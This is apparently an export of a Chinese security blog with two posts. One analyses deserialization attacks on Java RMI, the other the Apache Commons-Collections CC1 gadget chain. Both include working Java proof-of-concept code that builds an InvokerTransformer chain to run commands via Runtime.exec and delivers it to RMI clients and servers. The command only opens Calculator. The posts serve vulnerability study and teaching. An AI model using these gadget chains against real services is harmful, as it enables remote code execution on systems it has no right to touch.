<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RMI反序列化分析</title>
    <url>/2021/10/26/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20dd644916349848a0b8c4ef825b656560/</url>
    <content><![CDATA[<blockquote>
<p><strong>本文分析了RMI的通信过程以及一些反序列化攻击的场景</strong></p>
</blockquote>
<span id="more"></span>

<h2 id="1、RMI是什么"><a href="#1、RMI是什么" class="headerlink" title="1、RMI是什么"></a>1、RMI是什么</h2><p>RMI(Remote Method Invocatio)，是一种跨JVM实现方法调用的技术。一般由三个部分组成</p>
<ul>
<li>Client(客户端) Registry取得服务端注册的服务，然后调用远程方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// search service which called evil and cast type to EvilService</span></span><br><span class="line">EvilService evilService = (EvilService) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//call evil method and need to call &quot;put&quot; function to trigger</span></span><br><span class="line"><span class="comment">//evilTransformerMap方法具体的执行逻辑是在服务端执行的，并返回结果给client</span></span><br><span class="line">Map evilObject = (Map)evilService.evilTransformerMap();</span><br></pre></td></tr></table></figure>
</li>
<li>Registry(注册中心) 可以理解成一个存储远程对象的字典，负责网络传输的模块</li>
</ul>
<!--more-->

<ul>
<li>Server(服务端) 负责在注册中心注册服务，其实就是将一个远程对象给Registry进行封装  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化一个EvilService 即要绑定的对象</span></span><br><span class="line">EvilService evilService = <span class="keyword">new</span> EvilServiceImpl();</span><br><span class="line"><span class="comment">// 将此服务转换为远程服务接口</span></span><br><span class="line">EvilService skeleton = (EvilService) UnicastRemoteObject.exportObject(evilService,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//创建注册中心</span></span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//将服务注册</span></span><br><span class="line">registry.bind(<span class="string">&quot;evil&quot;</span>,skeleton);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>PS:在低版本的JDK中，<code>Server</code>与<code>Registry</code>是可以不在一台服务器上的，而在高版本的JDK中，<code>Server</code>与<code>Registry</code>只能在一台服务器上，否则无法注册成功。</p>
<h2 id="2、服务端或服务端与注册中心通信"><a href="#2、服务端或服务端与注册中心通信" class="headerlink" title="2、服务端或服务端与注册中心通信"></a>2、服务端或服务端与注册中心通信</h2><h3 id="2-1-本地获取注册中心"><a href="#2-1-本地获取注册中心" class="headerlink" title="2.1 本地获取注册中心"></a>2.1 本地获取注册中心</h3><p>本地获取是在创建的同时返回<code>Registry</code>对象(<code>RegistryImpl</code>)通过<code>createRegistry</code> 方法如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>获取对象后可以进行<code>bind,list,lookup,rebind,unbind</code>等操作</p>
<h3 id="2-2-远程获取注册中心"><a href="#2-2-远程获取注册中心" class="headerlink" title="2.2 远程获取注册中心"></a>2.2 远程获取注册中心</h3><p>通过<code>getRegistry</code>方法获得的对象是<code>RegistryImpl_Stub</code>对象而<code>createRegistry</code>获得的是<code>RegistryImpl</code>对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>这两者的区别在于在对<code>Registry</code>进行操作的时候流程会有不同，有兴趣的同学可以尝试打断点进行调试查看具体区别</p>
<h3 id="2-3-客户端与服务端的通信"><a href="#2-3-客户端与服务端的通信" class="headerlink" title="2.3 客户端与服务端的通信"></a>2.3 客户端与服务端的通信</h3><p>这里主要讲一下会引发反序列化的环节</p>
<p>当客户端发起调用远程方法的时候，实际上是客户端与2.4中的<code>Skeleton</code>进行通信，而如果返回客户端的执行结果是一个对象，则在客户端会对其进行反序列化</p>
<p>而当服务端接收的某个参数类型是Object的时候，则会出现在服务端反序列化的情况。</p>
<h3 id="2-4-流程图"><a href="#2-4-流程图" class="headerlink" title="2.4 流程图"></a>2.4 流程图</h3><p><img src="/2021/10/26/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20dd644916349848a0b8c4ef825b656560/Untitled.png" alt="Untitled"></p>
<h2 id="3、反序列化攻击"><a href="#3、反序列化攻击" class="headerlink" title="3、反序列化攻击"></a>3、反序列化攻击</h2><h3 id="3-1-攻击Registry"><a href="#3-1-攻击Registry" class="headerlink" title="3.1 攻击Registry"></a>3.1 攻击Registry</h3><p>注册中心直接利用<code>bind</code>或<code>rebind</code>即可攻击这里不再赘述了</p>
<h3 id="3-2-攻击Client"><a href="#3-2-攻击Client" class="headerlink" title="3.2 攻击Client"></a>3.2 攻击Client</h3><p><strong>EvilObject</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilServiceImpl</span> <span class="keyword">implements</span> <span class="title">EvilService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilServiceImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Transformer <span class="title">gadgetTransformerChain</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                            String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                            Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformerChain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">evilTransformerMap</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">//转化为map</span></span><br><span class="line">        Map outputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,gadgetTransformerChain());</span><br><span class="line">        <span class="keyword">return</span> outputMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Server</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化一个EvilService</span></span><br><span class="line">            EvilService evilService = <span class="keyword">new</span> EvilServiceImpl();</span><br><span class="line">            <span class="comment">// 将此服务转换为远程服务接口</span></span><br><span class="line">            EvilService skeleton = (EvilService) UnicastRemoteObject.exportObject(evilService,<span class="number">0</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,skeleton);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// search service which called evil and cast type to EvilService</span></span><br><span class="line">        EvilService evilService = (EvilService) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//call evil method and need to call &quot;put&quot; function to trigger</span></span><br><span class="line">        <span class="comment">//deserialize will happen when function evilTransformerMap() is called</span></span><br><span class="line">        Map evilObject = (Map)evilService.evilTransformerMap();</span><br><span class="line"></span><br><span class="line">        evilObject.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-攻击Server"><a href="#3-3-攻击Server" class="headerlink" title="3.3 攻击Server"></a>3.3 攻击Server</h3><p>大体上没什么变化只是<code>evilObject</code>的发送方产生了变化</p>
<p><strong>RMIClient</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        Map outputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        Service service = (Service) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">//触发服务端反序列化</span></span><br><span class="line">        service.evil(outputMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ServiceImpl</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceImpl</span> <span class="keyword">implements</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServiceImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">(Object evilObject)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        ((Map) evilObject).put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4、修复"><a href="#4、修复" class="headerlink" title="4、修复"></a>4、修复</h2><p>1、在高版本的<code>jdk(8u141)</code>中,<code>RegistryImpl#bind</code>中添加了一个<code>checkAccess</code>方法，来检验你的来源是否为<code>localhost</code> ,这个修复解决了攻击注册中心的问题</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><hr>
<p><a href="https://paper.seebug.org/1251/#_9">Java 安全-RMI-学习总结</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>通过Apache Common-collections分析Java反序列化</title>
    <url>/2021/10/25/%E9%80%9A%E8%BF%87Apache%20Common-collections%E5%88%86%E6%9E%90Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20a077483736be4fc9b4c0a7638e574c4b/</url>
    <content><![CDATA[<hr>
<blockquote>
<p><strong>本文将通过Apache Commons-collections爆出的反序列化漏洞来作为例子进行Java反序列化的原理分析</strong></p>
</blockquote>
<span id="more"></span>

<p>PS : cc1(CC3.1+AnnotationInvocationHandler)</p>
<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、<strong>前言</strong></h2><p>本文将通过 Apache Commons-collections爆出的反序列化漏洞来作为例子进行原理分析。</p>
<h2 id="2、漏洞成因"><a href="#2、漏洞成因" class="headerlink" title="2、漏洞成因"></a>2、<strong>漏洞成因</strong></h2><p>在这个Java反序列化漏洞的利用链主要由三个部分组成</p>
<p>1、可以执行恶意代码的对象（在这个例子中即为<code>Commons-collection</code>中的<code>Transformer</code>类）</p>
<p>2、一个被恶意对象“寄生的宿主”，通俗的来说就是，宿主对象反序列化的时候因为需要执行<code>readObject</code>方法，而<code>readObject</code>方法在可以被序列化的类中需要被重写，重写后的方法可能存在某些能够触发恶意对象执行的操作。</p>
<p>3、需要一个能够将恶意对象进行包装的类。在有的情况下恶意对象没有办法直接‘寄生“在宿主上，这时候就需要一个类能够将恶意对象进行包装</p>
<p>在这个例子中恶意代码对象为<code>Commons-collection</code>中的<code>Transformer</code>类，这个类原本的设计是用来对类进行转换，而通过精心设计（后文会详细讲解）后能够通过这个类的<code>transform</code>方法实现命令执行。而被寄生的宿主为<code>AnnotationInvocationHandlerMap</code>类，通过其<code>readObject</code>方法能够触发漏洞。</p>
<p>而<code>AnnotationInvocationHandlerMap</code>类中有一个<code>Map</code>类型的成员变量<code>memberValues</code>，<code>Transformer</code>类可以通过用<code>Map</code>类包装寄生在<code>AnnotationInvocationHandlerMap</code>类</p>
<p>接下来会分为两个部分解释，即1如何通过<code>transfomer</code>进行命令执行，2是如何利用反序列化完成一个调用链</p>
<h2 id="3、Transformer类的作用"><a href="#3、Transformer类的作用" class="headerlink" title="3、Transformer类的作用"></a>3、<strong>Transformer类的作用</strong></h2><p>首先我们先看一下导致这个问题的核心类<code>Transformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个接口类，需要实现一个<code>transform</code>方法，而<code>transform</code>方法的目的是将<code>input object</code>转换为一个<code>output object</code> 从而完成类型的转换。</p>
<p>在整个调用过程中用到了三个实现<code>Transformer</code>的实现类<code>ConstantTransformer </code> <code>InvokerTransformer </code></p>
<p> <code>ChainedTransformer.</code></p>
<h3 id="3-1-ConstantTransformer"><a href="#3-1-ConstantTransformer" class="headerlink" title="3.1 ConstantTransformer"></a><strong>3.1 ConstantTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省去了部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serial version UID */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The closures to call in turn */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过查看<code>ConstantTransformer</code>的源码发现，其<code>transform</code>方法无论输入什么类型都会返回一种初始化时定好的类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="keyword">new</span> ConstantTransformer(Runtime.class).transform(String.class));</span><br><span class="line"><span class="comment">//输出：class java.lang.Runtime</span></span><br><span class="line"><span class="comment">//无论transform的参数是什么都会得到相同的结果</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2-InvokerTransformer"><a href="#3-2-InvokerTransformer" class="headerlink" title="3.2 InvokerTransformer"></a>3.2 <strong>InvokerTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省去了部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">          ***</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>的<code>transform</code>方法则是将传入的类的某种方法（方法名和参数同样在初始化的时候设定好了）利用<code>invoke</code>进行调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;).transform(Runtime.class));</span><br><span class="line">//output：public static java.lang.Runtime java.lang.Runtime.getRuntime()</span><br></pre></td></tr></table></figure>

<p>当输入的参数为<code>Runtime.class</code>时相当于会调用<code>Runtime.class</code>的<code>getMethod</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到这个方法所需要的参数为name和参数类型，所以我们如果需要获取<code>Runtime</code>的<code>getRuntime</code>方法则需要传入的参数为 <code>“getRuntime”</code> 即方法名以及其对应的参数类型<code>Class&lt;?&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>getRuntime</code>是个无参函数，所以传入一个空的Class数组即可。即<code>Class[0]</code>。</p>
<h3 id="3-3-ChainedTransformer"><a href="#3-3-ChainedTransformer" class="headerlink" title="3.3 ChainedTransformer"></a>3.3 <strong>ChainedTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serial version UID */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The transformers to call in turn */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>的<code>transform</code>方法的作用是调用多个<code>transfomer</code>的<code>transform</code>依次对<code>object</code>进行操作也就是可以将多个<code>transformer</code>串联起来</p>
<h3 id="3-4-命令执行"><a href="#3-4-命令执行" class="headerlink" title="3.4 命令执行"></a>3.4 <strong>命令执行</strong></h3><p>假设我们需要执行一段这样的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>那我们可以构造如下的调用链来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformer.transform(<span class="keyword">new</span> Object());</span><br></pre></td></tr></table></figure>

<p>即以上四个<code>Transformer</code>构成了一个<code>ChainedTransformer</code>，最终通过调用<code>ChainedTransformer</code>的<code>transform</code>方法来实现命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过ConstantTransformer先将传入的obejct修改为Runtime.class</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之前提到过<code>InvokerTransformer</code>的<code>transformer</code>方法的作用是利用反射调用输入对象的某个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将Runtime.class作为输入可以得到getRuntime的Method对象</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用Method对象的invoke方法,参数为new Object[]&#123;null,new Object[0]&#125;</span></span><br><span class="line"><span class="comment">//相当于执行method(getRuntime).invoke(null,new Object[0])</span></span><br><span class="line"><span class="comment">//由于getRuntime为静态方法，所以不需要传入实例，所以invoke方法的第一个参数可以为null,之前提到过getRuntime为无参方法所以参数只需要传入new Object[0]即一个空数组，至于这里为什么不也传入一个null是因为当invoke做遍历args时不会报错</span></span><br><span class="line"><span class="comment">//所以这个InvokerTransformer达到了传入一个Method对象转化为一个Runtime对象的目的</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line"><span class="comment">//拿到Runtime对象后再通过一次反射进行命令执行即可</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="3-5-TransformedMap"><a href="#3-5-TransformedMap" class="headerlink" title="3.5 TransformedMap"></a>3.5 <strong>TransformedMap</strong></h3><p>以上的调用方式最终需要<code>ChainedTransformer</code>调用<code>transform</code>方法，那现在问题就变成了如何去触发这个方法，通过find usage看看有哪些类用到了<code>Transformer</code>，可以看到有一个<code>TransformedMap</code>使用了，对源码进行查看</p>
<p><img src="/2021/10/25/%E9%80%9A%E8%BF%87Apache%20Common-collections%E5%88%86%E6%9E%90Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20a077483736be4fc9b4c0a7638e574c4b/Untitled.png" alt="Untitled"></p>
